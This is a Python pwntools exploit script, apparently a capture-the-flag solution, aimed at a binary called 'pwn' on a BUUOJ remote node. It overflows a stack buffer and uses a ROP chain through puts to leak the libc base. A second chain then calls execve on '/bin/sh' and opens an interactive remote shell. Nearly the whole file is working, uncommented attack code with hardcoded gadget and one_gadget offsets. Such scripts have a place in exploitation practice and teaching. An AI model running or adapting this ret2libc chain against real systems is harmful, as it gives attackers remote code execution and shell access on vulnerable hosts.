import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='pwn'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',26085)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]




		pop_rdi=0x0000000000400843
		pay='a'*0x10c+'\x18'+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])
		pay+=p64(0x4005E0)
		io.recv()
		io.sendline(pay)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		system_addr=libc.sym['execve']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		pay='a'*0x10c+'\x18'+p64(pop_rdi)+p64(bin_sh_addr)
		pay+=p64(libc_base+0x00000000001150c9)+p64(0)*2+p64(system_addr)
		pay+=p64(0x4005E0)
		io.recv()
		io.sendline(pay)











		success('libc_base:'+hex(libc_base))
		# pdbg.bp([0x40078E])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue